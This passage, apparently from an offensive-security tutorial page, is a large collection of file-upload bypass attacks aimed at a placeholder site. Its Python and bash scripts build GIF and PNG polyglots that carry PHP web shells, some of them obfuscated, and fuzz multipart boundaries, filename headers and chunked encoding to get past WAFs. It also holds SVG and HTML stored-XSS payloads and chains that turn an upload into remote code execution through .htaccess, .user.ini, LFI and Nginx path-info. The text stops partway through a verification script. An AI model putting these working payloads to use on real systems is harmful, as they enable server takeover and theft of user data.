  # ═══════════════════════════════════════════
  python3 << 'GIFPOLY'
  gif = bytearray()
  
  # GIF Header
  gif += b'GIF89a'
  
  # Logical Screen Descriptor (1x1 pixel)
  gif += b'\x01\x00'  # Width: 1
  gif += b'\x01\x00'  # Height: 1
  gif += b'\x80'       # GCT flag + color resolution
  gif += b'\x00'       # Background color
  gif += b'\x00'       # Pixel aspect ratio
  
  # Global Color Table (2 entries, 6 bytes)
  gif += b'\x00\x00\x00'  # Color 0: black
  gif += b'\xff\xff\xff'  # Color 1: white
  
  # Image Descriptor
  gif += b'\x2c'
  gif += b'\x00\x00\x00\x00'  # Left, Top
  gif += b'\x01\x00\x01\x00'  # Width, Height
  gif += b'\x00'               # Flags
  
  # Image Data
  gif += b'\x02'       # LZW minimum code size
  gif += b'\x02'       # Block size
  gif += b'\x4c\x01'   # Compressed data
  gif += b'\x00'       # Block terminator
  
  # GIF Trailer
  gif += b'\x3b'
  
  # PHP payload AFTER valid GIF structure
  gif += b'\n<?php system($_GET["cmd"]); ?>'
  
  with open('polyglot_valid.gif', 'wb') as f:
      f.write(gif)
  
  import subprocess
  print(f"Type: {subprocess.getoutput('file -b polyglot_valid.gif')}")
  
  try:
      from PIL import Image
      img = Image.open('polyglot_valid.gif')
      print(f"Pillow: {img.format} {img.size} — valid image!")
  except Exception as e:
      print(f"Pillow: {e}")
  GIFPOLY
  
  # Upload with various strategies
  cp polyglot_valid.gif polyglot.gif
  cp polyglot_valid.gif polyglot.php
  cp polyglot_valid.gif polyglot.php.gif
  cp polyglot_valid.gif polyglot.gif.php
  
  for f in polyglot.gif polyglot.php polyglot.php.gif polyglot.gif.php; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f;type=image/gif" -b "session=COOKIE" 2>/dev/null)
    echo "$f → HTTP $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PNG/PHP Polyglot"}
  ```python
  #!/usr/bin/env python3
  """
  PNG/PHP Polyglot Generator
  Creates a valid PNG with PHP embedded in tEXt chunk
  Passes file command, finfo, Pillow, and imagemagick validation
  """
  import struct, zlib, os, subprocess
  
  def create_chunk(chunk_type, data):
      chunk = chunk_type + data
      return struct.pack('>I', len(data)) + chunk + struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
  
  def create_png_polyglot(php_payload, output_file):
      png = b'\x89PNG\r\n\x1a\n'  # 8-byte PNG signature
      
      # IHDR chunk: 1x1 pixel, 8-bit RGB
      ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
      png += create_chunk(b'IHDR', ihdr)
      
      # tEXt chunk: keyword\x00text
      text_data = b'Comment\x00' + php_payload.encode()
      png += create_chunk(b'tEXt', text_data)
      
      # IDAT chunk: minimal image data (1 red pixel)
      raw = b'\x00\xff\x00\x00'  # filter=None, R=255, G=0, B=0
      compressed = zlib.compress(raw)
      png += create_chunk(b'IDAT', compressed)
      
      # IEND chunk
      png += create_chunk(b'IEND', b'')
      
      with open(output_file, 'wb') as f:
          f.write(png)
      return len(png)
  
  
  payloads = {
      'system':     '<?php system($_GET["cmd"]); ?>',
      'shell_exec': '<?php echo shell_exec($_GET["cmd"]); ?>',
      'short':      '<?=`$_GET[c]`?>',
      'eval':       '<?php eval(base64_decode($_GET["e"])); ?>',
      'obfuscated': '<?php $a="sys"."tem";$a($_GET["cmd"]); ?>',
  }
  
  os.makedirs('png_poly', exist_ok=True)
  
  for name, payload in payloads.items():
      fname = f'png_poly/poly_{name}.png'
      size = create_png_polyglot(payload, fname)
      
      ftype = subprocess.run(['file', '-b', fname], capture_output=True, text=True).stdout.strip()
      
      try:
          from PIL import Image
          img = Image.open(fname)
          pil = f"{img.format} {img.size}"
      except:
          pil = "FAILED"
      
      print(f"  {fname:35s} ({size:3d}B) → {ftype} | Pillow: {pil}")
  
  print(f"\nUpload: curl -X POST URL -F 'file=@png_poly/poly_system.png;type=image/png' -b cookie")
  ```
  :::
::

---

## Multipart Request Structure Manipulation

::note
Beyond Content-Type and magic bytes, the HTTP multipart request structure itself can be tampered with. Different parsers handle boundary values, header ordering, duplicate fields, and encoding differently — creating desynchronization between WAFs and application servers.
::

::accordion
  :::accordion-item{icon="i-lucide-terminal" label="Boundary Manipulation"}
  The multipart boundary separates form fields and file content. Unusual boundaries can confuse WAFs.

  ```bash
  # ═══════════════════════════════════════════
  #  Boundary Manipulation via Raw Sockets
  # ═══════════════════════════════════════════
  
  python3 << 'BNDEOF'
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  shell = '<?php echo md5("boundary_bypass"); ?>'
  
  boundary_tests = [
      ("normal",          "----WebKitFormBoundary7MA4YWx"),
      ("very_long",       "A" * 2000),
      ("single_char",     "x"),
      ("just_dashes",     "----"),
      ("with_spaces",     "boundary with spaces"),
      ("email_style",     "--=_NextPart_000_0001_01D"),
      ("empty",           ""),
      ("special_chars",   "bnd+test/value=1"),
      ("unicode",         "böündary"),
      ("null_byte",       "boundary\x00end"),
      ("tab",             "bound\tary"),
      ("very_short",      "b"),
      ("numeric",         "1234567890"),
      ("equals_sign",     "boundary===test"),
  ]
  
  for name, boundary in boundary_tests:
      try:
          body = f"--{boundary}\r\n"
          body += f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
          body += "Content-Type: image/jpeg\r\n\r\n"
          body += f"{shell}\r\n"
          body += f"--{boundary}--\r\n"
  
          safe_bnd = boundary.replace('"', '\\"')[:50]
          req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
          req += f'Content-Type: multipart/form-data; boundary="{safe_bnd}"\r\n'
          req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
  
          ctx = ssl.create_default_context()
          ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(req.encode('latin-1', errors='replace'))
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          status = resp.split(b'\r\n')[0].decode()
          bnd_show = repr(boundary[:40]) + ("..." if len(boundary) > 40 else "")
          print(f"  [{name:15s}] boundary={bnd_show:45s} → {status}")
      except Exception as e:
          print(f"  [{name:15s}] → ERROR: {e}")
  BNDEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Content-Disposition Manipulation"}
  The `Content-Disposition` header defines the field name and filename. Parser disagreements on how to handle duplicate parameters, encoding variants, and quote styles create bypass opportunities.

  ```bash
  # ═══════════════════════════════════════════
  #  Content-Disposition Tricks (Burp Suite / raw sockets)
  # ═══════════════════════════════════════════
  
  # Double filename (parser takes first OR last)
  Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"
  Content-Disposition: form-data; name="file"; filename="shell.php"; filename="safe.jpg"
  
  # RFC 5987 filename* (some parsers prefer this)
  Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename*=UTF-8''shell.php
  Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php; filename="safe.jpg"
  Content-Disposition: form-data; name="file"; filename*=UTF-8''shell%2Ephp
  
  # Quote variations
  Content-Disposition: form-data; name="file"; filename="shell.php"    # Double quotes
  Content-Disposition: form-data; name="file"; filename='shell.php'    # Single quotes
  Content-Disposition: form-data; name="file"; filename=shell.php      # No quotes
  Content-Disposition: form-data; name="file"; filename="shell.php     # Unclosed quote
  
  # Reversed parameter order
  Content-Disposition: form-data; filename="shell.php"; name="file"
  
  # Extra parameters
  Content-Disposition: form-data; name="file"; filename="shell.php"; size="1234"
  Content-Disposition: form-data; name="file"; dummy="x"; filename="shell.php"
  
  # Whitespace and newline injection
  Content-Disposition: form-data;    name="file";    filename="shell.php"
  Content-Disposition:form-data;name="file";filename="shell.php"
  Content-Disposition: form-data; name="file"; filename="shell.php
  .jpg"
  
  # ═══════════════════════════════════════════
  #  Python Content-Disposition Fuzzer
  # ═══════════════════════════════════════════
  python3 << 'CDEOF'
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  bnd = "----CDTest"
  shell = '<?php echo md5("cd_fuzz"); ?>'
  
  dispositions = [
      'form-data; name="file"; filename="safe.jpg"; filename="shell.php"',
      'form-data; name="file"; filename="shell.php"; filename="safe.jpg"',
      "form-data; name=\"file\"; filename*=UTF-8''shell.php",
      "form-data; name=\"file\"; filename=\"safe.jpg\"; filename*=UTF-8''shell.php",
      "form-data; name=\"file\"; filename*=UTF-8''shell%2Ephp",
      "form-data; name=\"file\"; filename='shell.php'",
      "form-data; name=\"file\"; filename=shell.php",
      'form-data; filename="shell.php"; name="file"',
      'form-data; name="file"; filename="shell.php"; size="100"',
      'form-data; name="file"; dummy="shell.php"; filename="safe.jpg"',
      'form-data; name="file"; name="other"; filename="shell.php"',
  ]
  
  for cd in dispositions:
      body = f"--{bnd}\r\nContent-Disposition: {cd}\r\n"
      body += "Content-Type: image/jpeg\r\n\r\n"
      body += f"{shell}\r\n--{bnd}--\r\n"
  
      req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
      req += f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
      req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
  
      try:
          ctx = ssl.create_default_context()
          ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(req.encode('latin-1'))
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          status = resp.split(b'\r\n')[0].decode()
          print(f"  {cd[:65]:65s} → {status}")
      except Exception as e:
          print(f"  {cd[:65]:65s} → ERR")
  CDEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Duplicate Fields, Part Ordering & Padding"}
  ```bash
  # ═══════════════════════════════════════════
  #  Duplicate File Fields (same field name, different files)
  # ═══════════════════════════════════════════
  # Server may process first, WAF may check second (or vice versa)
  
  echo "legitimate image data" > /tmp/safe.jpg
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
  
  # Safe first, malicious second
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/safe.jpg;type=image/jpeg" \
    -F "file=@/tmp/shell.php;type=image/jpeg" \
    -b "session=COOKIE"
  
  # Malicious first, safe second
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/shell.php;type=image/jpeg" \
    -F "file=@/tmp/safe.jpg;type=image/jpeg" \
    -b "session=COOKIE"
  
  # ═══════════════════════════════════════════
  #  Large Padding Before File (WAF buffer exhaust)
  # ═══════════════════════════════════════════
  PADDING=$(python3 -c "print('X' * 100000)")
  curl -X POST https://target.com/upload \
    -F "padding=$PADDING" \
    -F "file=@/tmp/shell.php;type=image/jpeg" \
    -b "session=COOKIE"
  
  # Many dummy fields before file
  curl -X POST https://target.com/upload \
    -F "dummy1=test" -F "dummy2=test" -F "dummy3=test" \
    -F "dummy4=test" -F "dummy5=test" -F "dummy6=test" \
    -F "dummy7=test" -F "dummy8=test" -F "dummy9=test" \
    -F "file=@/tmp/shell.php;type=image/jpeg" \
    -b "session=COOKIE"
  
  # ═══════════════════════════════════════════
  #  Reversed Part Header Order
  #  Put Content-Type BEFORE Content-Disposition
  # ═══════════════════════════════════════════
  # Must use raw request — normal tools put Disposition first
  
  python3 << 'ORDEREOF'
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  bnd = "----OrderTest"
  shell = '<?php echo md5("order_bypass"); ?>'
  
  # Normal order: Disposition → Type → Body
  normal = f"--{bnd}\r\n"
  normal += 'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
  normal += "Content-Type: image/jpeg\r\n\r\n"
  normal += f"{shell}\r\n--{bnd}--\r\n"
  
  # Reversed order: Type → Disposition → Body
  reversed_order = f"--{bnd}\r\n"
  reversed_order += "Content-Type: image/jpeg\r\n"
  reversed_order += 'Content-Disposition: form-data; name="file"; filename="test.php"\r\n\r\n'
  reversed_order += f"{shell}\r\n--{bnd}--\r\n"
  
  # No Content-Type at all
  no_ct = f"--{bnd}\r\n"
  no_ct += 'Content-Disposition: form-data; name="file"; filename="test.php"\r\n\r\n'
  no_ct += f"{shell}\r\n--{bnd}--\r\n"
  
  for name, body in [("normal_order", normal), ("reversed_order", reversed_order), ("no_content_type", no_ct)]:
      req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
      req += f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
      req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
      
      try:
          ctx = ssl.create_default_context()
          ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(req.encode('latin-1'))
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          print(f"  [{name:20s}] → {resp.split(b'\\r\\n')[0].decode()}")
      except Exception as e:
          print(f"  [{name:20s}] → ERROR: {e}")
  ORDEREOF
  ```
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Chunked Transfer Encoding"}
  Chunked transfer encoding splits the request body into chunks. WAFs that don't reassemble chunked bodies will fail to inspect the file content, while the application server reassembles it correctly.

  ```python
  #!/usr/bin/env python3
  """Upload file using chunked transfer encoding to bypass WAF"""
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  boundary = "----ChunkedTest"
  
  # Construct multipart body
  body = f"--{boundary}\r\n"
  body += 'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
  body += "Content-Type: image/jpeg\r\n\r\n"
  body += '<?php system($_GET["cmd"]); ?>\r\n'
  body += f"--{boundary}--\r\n"
  
  # Convert to chunked encoding with small chunk sizes
  # Small chunks mean WAF sees incomplete data in each chunk
  chunk_sizes = [5, 10, 20, 50, 1]  # Test different sizes
  
  for chunk_size in chunk_sizes:
      chunked_body = ""
      for i in range(0, len(body), chunk_size):
          chunk = body[i:i+chunk_size]
          chunked_body += f"{len(chunk):x}\r\n{chunk}\r\n"
      chunked_body += "0\r\n\r\n"  # Terminal chunk
      
      request = f"POST /upload HTTP/1.1\r\n"
      request += f"Host: {host}\r\n"
      request += f"Cookie: {cookie}\r\n"
      request += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
      request += f"Transfer-Encoding: chunked\r\n"
      request += f"Connection: close\r\n\r\n"
      request += chunked_body
      
      try:
          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(request.encode('latin-1'))
          
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          
          status = resp.split(b'\r\n')[0].decode()
          print(f"  Chunk size {chunk_size:3d} → {status}")
      except Exception as e:
          print(f"  Chunk size {chunk_size:3d} → ERROR: {e}")
  ```
  :::
::

---

## Combined Bypass Strategies

::tip
The most effective MIME bypasses combine multiple techniques that target different validation layers simultaneously. Match the combination to the detected validation.
::

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: CT-Only Bypass
  ---
  **Detected:** Server checks only Content-Type header
  
  **Bypass:** `file=@shell.php;type=image/jpeg`
  
  Just change the Content-Type value. Keep `.php` extension and PHP content unchanged. Simplest bypass.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: CT + Extension Bypass
  ---
  **Detected:** Server checks Content-Type AND extension
  
  **Bypass:** Use `.jpg` extension + `image/jpeg` MIME + PHP content. Chain with `.htaccess` upload, LFI, or double extension for execution.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: CT + Magic Bypass
  ---
  **Detected:** Server checks Content-Type AND magic bytes
  
  **Bypass:** `GIF89a` + PHP shell + `image/gif` MIME. Magic bytes satisfy content check, spoofed header satisfies header check.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: CT + Magic + Extension Bypass
  ---
  **Detected:** Server cross-validates all three
  
  **Bypass:** JPEG magic + `image/jpeg` MIME + `.jpg` extension. PHP in EXIF metadata. Chain with double extension or `.htaccess` for execution.
  :::
::

::code-collapse
```bash [Combined Bypass Matrix — Automated Testing]
#!/bin/bash
# ╔═══════════════════════════════════════════════╗
# ║  Combined MIME Bypass Matrix                   ║
# ║  Tests all permutations of magic + ext + MIME  ║
# ╚═══════════════════════════════════════════════╝

TARGET="${1:?Usage: $0 <url> <cookie> [field]}"
COOKIE="${2:?}"
FIELD="${3:-file}"

PHP='<?php echo md5("combined_test"); ?>'

echo "=== Combined MIME Bypass Matrix ==="
echo "Target: $TARGET"
echo ""

# Define components
declare -A MAGIC_DATA
MAGIC_DATA[none]=""
MAGIC_DATA[gif]="$(printf 'GIF89a\n')"
MAGIC_DATA[jpg]="$(printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00')"
MAGIC_DATA[png]="$(printf '\x89PNG\r\n\x1a\n')"
MAGIC_DATA[bmp]="$(printf 'BM')"

EXTENSIONS=("php" "php5" "phtml" "phar" "jpg" "png" "gif" "php.jpg" "php.png" "php.gif" "php.xyz")
MIMES=("image/jpeg" "image/png" "image/gif" "application/octet-stream" "text/plain" "image/bmp")

UPLOADED=0
TOTAL=0

for magic_name in none gif jpg png bmp; do
  for ext in "${EXTENSIONS[@]}"; do
    for mime in "${MIMES[@]}"; do
      TOTAL=$((TOTAL + 1))

      # Build payload
      echo -n "${MAGIC_DATA[$magic_name]}$PHP" > /tmp/combined_test

      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "$TARGET" \
        -F "$FIELD=@/tmp/combined_test;filename=test.$ext;type=$mime" \
        -b "$COOKIE" 2>/dev/null)

      if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
        UPLOADED=$((UPLOADED + 1))
        echo "[+] magic=$magic_name ext=.$ext mime=$mime → HTTP $STATUS"
      fi
    done
  done
done

echo ""
echo "═══════════════════════════════════════"
echo " $UPLOADED / $TOTAL combinations accepted"
echo "═══════════════════════════════════════"

rm -f /tmp/combined_test
```
::

---

## MIME Spoofing for Stored XSS

::note
Even when server-side code execution is not achievable, MIME type manipulation can enable Stored XSS by causing the server to serve uploaded files with a Content-Type that allows browser script execution. If the server echoes back the uploaded file's Content-Type or performs MIME sniffing without the `X-Content-Type-Options: nosniff` header, JavaScript execution is possible.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="SVG Uploaded as Image"}
  ```bash
  # ═══════════════════════════════════════════
  #  SVG files are "images" but support JavaScript
  #  Many upload forms whitelist image/* MIME types
  # ═══════════════════════════════════════════
  
  cat > xss.svg << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100" fill="red"/>
  </svg>
  EOF
  
  # Upload as image/svg+xml (standard SVG MIME)
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/svg+xml" -b "session=COOKIE"
  
  # If SVG-specific MIME is blocked, try generic image MIME
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/png" -b "session=COOKIE"
  
  curl -X POST https://target.com/upload \
    -F "file=@xss.svg;type=image/jpeg" -b "session=COOKIE"
  
  # Check serving behavior
  curl -sI https://target.com/uploads/xss.svg | grep -iE "content-type|content-disposition|x-content-type"
  # VULNERABLE if: Content-Type: image/svg+xml (browser renders + executes JS)
  # SAFE if: Content-Disposition: attachment (forces download)
  # SAFE if: Content-Type: application/octet-stream
  
  # ═══════════════════════════════════════════
  #  Advanced SVG XSS payloads with different triggers
  # ═══════════════════════════════════════════
  
  # Script tag
  cat > xss_script.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>
  EOF
  
  # foreignObject (HTML inside SVG)
  cat > xss_foreign.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
    <foreignObject width="500" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert(document.domain)</script>
      </body>
    </foreignObject>
  </svg>
  EOF
  
  # animate onbegin
  cat > xss_animate.svg << 'EOF'
  <svg xmlns="http://www.w3.org/2000/svg">
    <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
  </svg>
  EOF
  
  # Test all
  for f in xss.svg xss_script.svg xss_foreign.svg xss_animate.svg; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$f;type=image/svg+xml" -b "session=COOKIE" 2>/dev/null)
    echo "$f → HTTP $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTML Upload as Document/Image"}
  ```bash
  # ═══════════════════════════════════════════
  #  Upload HTML file with non-HTML MIME type
  #  Browser may MIME-sniff and render as HTML
  # ═══════════════════════════════════════════
  
  cat > xss.html << 'EOF'
  <html><body>
  <script>alert('XSS on ' + document.domain)</script>
  </body></html>
  EOF
  
  # Upload as text/plain
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;type=text/plain" -b "session=COOKIE"
  
  # Upload as application/octet-stream
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;type=application/octet-stream" -b "session=COOKIE"
  
  # Upload as text/html (direct)
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;type=text/html" -b "session=COOKIE"
  
  # Upload as image/jpeg (disguised)
  curl -X POST https://target.com/upload \
    -F "file=@xss.html;type=image/jpeg;filename=photo.jpg" -b "session=COOKIE"
  
  # ═══════════════════════════════════════════
  #  Check for MIME sniffing vulnerability
  # ═══════════════════════════════════════════
  # If X-Content-Type-Options: nosniff is MISSING
  # browsers may sniff HTML content regardless of Content-Type
  
  curl -sI https://target.com/uploads/xss.html | grep -i "x-content-type-options"
  # Missing → MIME sniffing possible → XSS even with text/plain Content-Type
  
  # ═══════════════════════════════════════════
  #  XHTML XSS (application/xhtml+xml)
  # ═══════════════════════════════════════════
  cat > xss.xhtml << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <html xmlns="http://www.w3.org/1999/xhtml">
  <body onload="alert(document.domain)"></body>
  </html>
  EOF
  
  curl -X POST https://target.com/upload \
    -F "file=@xss.xhtml;type=application/xhtml+xml" -b "session=COOKIE"
  
  curl -X POST https://target.com/upload \
    -F "file=@xss.xhtml;type=text/xml" -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="XSS via Filename Reflection"}
  ```bash
  # ═══════════════════════════════════════════
  #  If the uploaded filename is reflected in the UI
  #  The filename itself becomes an XSS vector
  # ═══════════════════════════════════════════
  
  # Filename with XSS payload
  curl -X POST https://target.com/upload \
    -F 'file=@test.jpg;filename="><img src=x onerror=alert(document.domain)>.jpg' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE"
  
  curl -X POST https://target.com/upload \
    -F 'file=@test.jpg;filename=<script>alert(1)</script>.jpg' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE"
  
  curl -X POST https://target.com/upload \
    -F "file=@test.jpg;filename=test.jpg' onmouseover='alert(1)" \
    -F 'type=image/jpeg' \
    -b "session=COOKIE"
  
  # SVG in filename (if filename is used in img src)
  curl -X POST https://target.com/upload \
    -F 'file=@test.jpg;filename=test.jpg" onerror="alert(1)' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE"
  
  # Test if filename appears in response
  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -F 'file=@test.jpg;filename=UNIQUE_FILENAME_MARKER_12345.jpg' \
    -F 'type=image/jpeg' \
    -b "session=COOKIE")
  echo "$RESPONSE" | grep -c "UNIQUE_FILENAME_MARKER_12345"
  # If count > 0 → filename IS reflected → XSS via filename possible
  ```
  :::
::

---

## Execution Chaining After Upload

When MIME spoofing gets the file uploaded but the server doesn't execute it directly, chain with these techniques to achieve execution.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label=".htaccess Chain"}
  ```bash
  # ═══════════════════════════════════════════
  #  Step 1: Upload .htaccess to make .jpg executable as PHP
  # ═══════════════════════════════════════════
  echo 'AddType application/x-httpd-php .jpg .png .gif' > .htaccess
  curl -X POST https://target.com/upload \
    -F "file=@.htaccess;type=text/plain" -b "session=COOKIE"
  
  # Alternative .htaccess payloads
  echo 'AddHandler application/x-httpd-php .jpg' > .htaccess
  echo 'SetHandler application/x-httpd-php' > .htaccess
  
  # ═══════════════════════════════════════════
  #  Step 2: Upload PHP shell with image extension + magic bytes
  # ═══════════════════════════════════════════
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif
  curl -X POST https://target.com/upload \
    -F "file=@shell.gif;type=image/gif" -b "session=COOKIE"
  
  # ═══════════════════════════════════════════
  #  Step 3: Execute
  # ═══════════════════════════════════════════
  curl "https://target.com/uploads/shell.gif?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label=".user.ini Chain"}
  ```bash
  # ═══════════════════════════════════════════
  #  Works with PHP-FPM/FastCGI (not mod_php)
  #  .user.ini auto-prepends a file to all PHP execution
  # ═══════════════════════════════════════════
  
  # Step 1: Upload .user.ini
  echo 'auto_prepend_file=shell.jpg' > .user.ini
  curl -X POST https://target.com/upload \
    -F "file=@.user.ini;type=text/plain" -b "session=COOKIE"
  
  # Step 2: Upload shell with image extension + magic bytes
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg;type=image/jpeg" -b "session=COOKIE"
  
  # Step 3: Access any PHP file in the same directory
  # shell.jpg is auto-prepended to every PHP execution
  curl "https://target.com/uploads/index.php?cmd=id"
  # Or wait ~5 minutes (user_ini.cache_ttl default) then try
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="LFI Chain"}
  ```bash
  # ═══════════════════════════════════════════
  #  Upload shell with any safe extension + magic bytes
  #  Then include it via Local File Inclusion
  # ═══════════════════════════════════════════
  
  # Step 1: Upload with magic bytes + image extension + image MIME
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > avatar.gif
  curl -X POST https://target.com/upload \
    -F "file=@avatar.gif;type=image/gif" -b "session=COOKIE"
  # Uploaded to: /uploads/avatar.gif
  
  # Step 2: Include via LFI vulnerability
  curl "https://target.com/index.php?page=../uploads/avatar.gif&cmd=id"
  curl "https://target.com/index.php?page=....//....//uploads/avatar.gif&cmd=id"
  curl "https://target.com/index.php?file=../uploads/avatar.gif&cmd=id"
  curl "https://target.com/index.php?template=../uploads/avatar&cmd=id"
  
  # With PHP wrappers
  curl "https://target.com/index.php?page=php://filter/resource=../uploads/avatar.gif&cmd=id"
  
  # Path traversal variations
  LFI_PATHS=(
    "../uploads/avatar.gif"
    "../../uploads/avatar.gif"
    "../../../uploads/avatar.gif"
    "....//uploads/avatar.gif"
    "....//....//uploads/avatar.gif"
    "..%2fuploads%2favatar.gif"
    "..%252fuploads%252favatar.gif"
  )
  
  for path in "${LFI_PATHS[@]}"; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" \
      "https://target.com/index.php?page=${path}&cmd=id" 2>/dev/null)
    echo "$path → HTTP $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nginx Path Info Chain"}
  ```bash
  # ═══════════════════════════════════════════
  #  Nginx + PHP-FPM with cgi.fix_pathinfo=1
  #  Upload image with PHP code, access via /image.jpg/x.php
  # ═══════════════════════════════════════════
  
  # Step 1: Upload image with PHP in EXIF or appended
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > avatar.gif
  curl -X POST https://target.com/upload \
    -F "file=@avatar.gif;type=image/gif" -b "session=COOKIE"
  
  # Step 2: Access with .php appended to path
  curl "https://target.com/uploads/avatar.gif/x.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/.php?cmd=id"
  curl "https://target.com/uploads/avatar.gif/anything.php?cmd=id"
  
  # Detect vulnerability without upload
  # Test against any existing static file
  IMAGES=$(curl -s https://target.com | grep -oP 'src="(/[^"]*\.(jpg|png|gif))"' | cut -d'"' -f2 | head -5)
  for img in $IMAGES; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com${img}/test.php" 2>/dev/null)
    if [ "$STATUS" != "404" ]; then
      echo "[!] VULNERABLE: ${img}/test.php → HTTP $STATUS"
    fi
  done
  ```
  :::
::

---

## Verification & Post-Upload

::steps{level="4"}

#### Locate the Uploaded File

```bash
# Check upload response for file path/URL
curl -s -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" -b "session=COOKIE" | \
  grep -oiE '"(url|path|src|href|file|location)":\s*"[^"]*"'

# Common upload directories to check
for dir in uploads files media images static content assets data documents user_uploads avatars; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$dir/shell.php" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ] && echo "[FOUND] /$dir/shell.php → HTTP $STATUS"
done
```

#### Verify File Was Saved (Not Just Accepted)

```bash
# Access the uploaded file and check headers
curl -sI "https://target.com/uploads/shell.php"

# Key headers to check:
# Content-Type: text/html         → PHP MAY be executing
# Content-Type: image/jpeg        → Served as image, NOT executing
# Content-Type: application/octet-stream → Download, NOT executing
# Content-Disposition: attachment  → Forces download, NOT executing
# X-Content-Type-Options: nosniff → Browser won't MIME-sniff
```

#### Test Code Execution

```bash
# Upload shell with unique marker
echo '<?php echo md5("rce_confirmed_" . php_uname()); ?>' > verify.php
curl -X POST https://target.com/upload \
  -F "file=@verify.php;type=image/jpeg" -b "session=COOKIE"

# Check for MD5 hash in response (proves PHP executed)
RESPONSE=$(curl -s "https://target.com/uploads/verify.php")
